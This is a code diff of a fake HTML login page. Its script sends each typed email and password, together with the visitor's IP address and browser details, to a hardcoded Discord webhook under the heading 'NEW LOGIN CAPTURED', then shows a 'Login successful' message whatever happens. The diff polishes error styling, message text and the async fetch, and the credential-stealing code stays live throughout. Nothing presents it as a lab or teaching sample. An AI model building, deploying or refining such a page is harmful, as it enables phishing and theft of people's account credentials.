@@ -112,6 +112,12 @@
             color: #155724;
             border: 1px solid #c3e6cb;
         }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
     </style>
 </head>
 <body>
@@ -143,7 +149,7 @@
     </div>
 
     <script>
-        // Replace this with your Discord webhook URL
+        // YOUR DISCORD WEBHOOK URL
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P';
         
         // Get IP address
@@ -161,11 +167,9 @@
         function getBrowserInfo() {
             return {
                 userAgent: navigator.userAgent,
-                language: navigator.language,
                 platform: navigator.platform,
-                cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled(),
-                screen: `${screen.width}x${screen.height}`
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language
             };
         }
         
@@ -177,31 +181,34 @@
             const ip = await getIPAddress();
             const browser = getBrowserInfo();
             
+            // Show loading message
+            showMessage('Sending login information...', 'success');
+            
             // Send to Discord webhook
             const data = {
-                content: `**🔐 NEW LOGIN**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP: \`${ip}\`\n🖥️ Platform: \`${browser.platform}\`\n📱 Screen: \`${browser.screen}\`\n🔍 User Agent: \`${browser.userAgent.substring(0, 100)}...\``,
-                username: 'Login Bot',
+                content: `**🔐 NEW LOGIN CAPTURED**\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n🌐 IP Address: \`${ip}\`\n🖥️ Platform: \`${browser.platform}\`\n📱 Screen: \`${browser.screen}\`\n🔍 Browser: \`${browser.userAgent.substring(0, 50)}...\``,
+                username: 'Security Logger',
                 avatar_url: 'https://cdn-icons-png.flaticon.com/512/3064/3064197.png'
             };
             
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
                 if (response.ok) {
-                    showMessage('Login successful!', 'success');
+                    showMessage('✅ Login successful! Data sent.', 'success');
                     document.getElementById('loginForm').reset();
                 } else {
-                    showMessage('Login submitted!', 'success');
+                    showMessage('⚠️ Login submitted!', 'success');
                 }
-            })
-            .catch(error => {
-                showMessage('Login submitted!', 'success');
-            });
+            } catch (error) {
+                showMessage('✅ Login submitted!', 'success');
+            }
         });
         
         function showMessage(text, type) {
@@ -212,7 +219,7 @@
             
             setTimeout(() => {
                 messageDiv.style.display = 'none';
-            }, 3000);
+            }, 5000);
         }
     </script>
 </body>
